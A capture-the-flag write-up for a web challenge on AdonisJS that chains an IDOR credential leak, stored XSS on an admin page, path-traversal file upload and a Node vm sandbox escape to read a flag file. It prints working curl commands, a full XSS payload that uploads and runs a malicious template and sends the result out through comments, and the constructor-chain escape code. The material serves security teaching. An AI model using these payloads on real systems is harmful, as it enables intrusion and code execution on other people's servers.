# Ado (Web): Write-up

## Challenge Overview

The challenge presents a fan community web app for the Japanese singer Ado, built on AdonisJS (Node.js/TypeScript). An admin bot periodically visits a moderation page. The challenge requires chaining four vulnerabilities — an IDOR credential leak, stored XSS, a path traversal file write, and a Node vm sandbox escape — to achieve RCE and read `/app/flag.txt`.

## Reconnaissance

The zip contains a full AdonisJS app. Useful things found on inspection:

- `resources/views/public/comments.edge` renders comment bodies with `{{ comment.body }}` (escaped).
- `resources/views/admin/comments.edge` renders them with `{{{ comment.body }}}` (raw HTML, no escaping).
- `bot/bot.js` logs in as admin and visits `/admin/comments` on a fixed interval (`INTERVAL_MS`).
- `config/session.ts` sets `httpOnly: false` and `sameSite: false` on the session cookie.
- `app/Controllers/Http/AccountsController.ts` has an endpoint that leaks user passwords in plaintext with no authentication check.
- `app/Controllers/Http/AdminUploadController.ts` calls `file.move(UPLOADS_DIR)` with no filename override, passing the raw client-supplied filename to `path.join`.
- `/admin/generate-report` reads `storage/reports/template.js` and executes it inside a plain `vm.createContext` sandbox, then returns the result as JSON.
- The app ships a local vendored copy of `bodyparser` instead of pulling it from npm — the tell that filename sanitization was deliberately removed.

## Vulnerability 1: IDOR — Credential Leak

`AccountsController` exposes an internal endpoint that returns user data including plaintext passwords. The check only filters on whether the username is `Hana` or `Rimi` — it never checks whether the caller is authenticated:

```typescript
public async show({ params, response }: HttpContextContract) {
  const id = Number(params.id)
  const user = store.findUserById(id)
  if (user.username !== 'Hana' && user.username !== 'Rimi') {
    return response.status(404).json({ error: 'Account not found' })
  }
  return response.json({
    id: user.id, username: user.username,
    email: user.email, recoveryToken: user.recoveryToken,
    password: user.password  // plaintext
  })
}
```

Enumerating IDs 3 and 4 with no session cookie returns Hana's credentials:

```bash
curl http://koala.nexsec.my:35023/api/v1/internal/accounts/3
# {"id":3,"username":"Hana","password":"Kyaaaaa_Adoo_kawaidesu_><",...}
```

These credentials work against the login endpoint.

## Vulnerability 2: Stored XSS on Admin Panel

The public comments page escapes output with double braces (`{{ comment.body }}`), but the admin moderation view at `/admin/comments` uses triple braces (`{{{ comment.body }}}`), which disables Edge's auto-escaping and renders raw HTML.

The admin bot (`bot/bot.js`) logs in as admin and visits `/admin/comments` on a regular interval. A script executing on this page can make same-origin authenticated `fetch()` calls using the admin's session. The cookie settings `httpOnly: false` and `sameSite: false` are also insecure, but neither is required for this same-origin request chain.

Posting a comment with a `<script>` tag to any post will execute that script in the admin's browser on their next visit.

## Vulnerability 3: Path Traversal File Write

The `/admin/upload` endpoint accepts a multipart file and moves it using a vendored, deliberately-patched copy of AdonisJS's bodyparser. The `move()` call passes no `name` override:

```typescript
await file.move(Application.tmpPath('uploads'))
```

Internally the patched bodyparser resolves the destination path as:

```javascript
options = Object.assign({ name: this.clientName, overwrite: true }, options)
const filePath = join(location, options.name)
```

`this.clientName` is the raw filename from the multipart `Content-Disposition` header, with no sanitization. Since `path.join` resolves `..` segments, uploading a file with the multipart filename `../reports/template.js` writes to `storage/reports/template.js` — overwriting the real report template that `/admin/generate-report` will execute next.

## Vulnerability 4: Node vm Sandbox Escape → RCE

`/admin/generate-report` reads `storage/reports/template.js` and runs it inside a plain `vm.createContext` sandbox:

```javascript
const sandbox = { module: { exports: {} } }
vm.createContext(sandbox)
vm.runInContext(code, sandbox, { filename: templatePath })
const result = sandbox.module.exports.generate()
```

The key observation: `sandbox.module.exports` is a plain object created in the **real Node realm** before `vm.createContext()` runs on it. When `vm.runInContext` assigns to `module.exports`, the new object is created inside the vm's isolated realm and loses the real-realm prototype chain. The fix is to **mutate** the existing object rather than replace it — attaching a function as a property preserves the real-realm `Function`/`Object` prototype chain on `this` inside that function.

From there, the constructor chain escape works:

```javascript
// this.constructor = Object (real realm)
// this.constructor.constructor = Function (real realm)
// Function('return process')() = real process global
var proc = this.constructor.constructor('return process')()
proc.mainModule.require('fs').readFileSync('/app/flag.txt', 'utf8')
```

The final `template.js` payload:

```javascript
module.exports.generate = function () {
  try {
    var f = this.constructor.constructor;
    var proc = f('return process')();
    return proc.mainModule.require('fs').readFileSync('/app/flag.txt', 'utf8');
  } catch (e) {
    return 'ERR:' + e.stack;
  }
}
```

## Full Exploit Chain

### Step 1 — Leak credentials via IDOR

```bash
curl http://koala.nexsec.my:PORT/api/v1/internal/accounts/3
# Returns: {"username":"Hana","password":"Kyaaaaa_Adoo_kawaidesu_><",...}
```

### Step 2 — Login as Hana

```bash
curl -c cookies.txt -X POST http://koala.nexsec.my:PORT/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"Hana","password":"Kyaaaaa_Adoo_kawaidesu_><"}'
# Returns: {"message":"Logged in","username":"Hana","role":"user"}
```

### Step 3 — Post the XSS payload

The payload, when the admin bot renders it, does three things in sequence: uploads a malicious `template.js` via path traversal, calls `/admin/generate-report` to execute it, and posts the flag as a comment on `postId:1338`.

```bash
curl -b cookies.txt -X POST http://koala.nexsec.my:PORT/api/v1/comments \
  -H "Content-Type: application/json" \
  -d '{
  "postId": 1,
  "body": "<script>(async()=>{try{const payload=`module.exports.generate=function(){try{var f=this.constructor.constructor;var proc=f(\"return process\")();return proc.mainModule.require(\"fs\").readFileSync(\"/app/flag.txt\",\"utf8\");}catch(e){return \"ERR:\"+e.stack;}}`;const fd=new FormData();fd.append(\"attachment\",new Blob([payload],{type:\"application/javascript\"}),\"../reports/template.js\");await fetch(\"/admin/upload\",{method:\"POST\",body:fd});const r=await fetch(\"/admin/generate-report\");const j=await r.json();await fetch(\"/api/v1/comments\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({postId:1338,body:\"EXFIL:\"+JSON.stringify(j.result)})});}catch(e){await fetch(\"/api/v1/comments\",{method:\"POST\",headers:{\"Content-Type\":\"application/json\"},body:JSON.stringify({postId:1338,body:\"ERR:\"+e.message})});}})();</script>"
}'
```

### Step 4 — Wait 15–60 seconds, then collect the flag

```bash
curl http://koala.nexsec.my:PORT/posts/1338/comments
# Comment body: EXFIL:"nexsec26{...}"
```

## Result

The exploit chain returns the report result through a comment prefixed with `EXFIL:`. The supplied write-up uses `nexsec26{...}` as a placeholder; since this is our first flag we forgot to save the flag hence the exact Ado flag was not included.
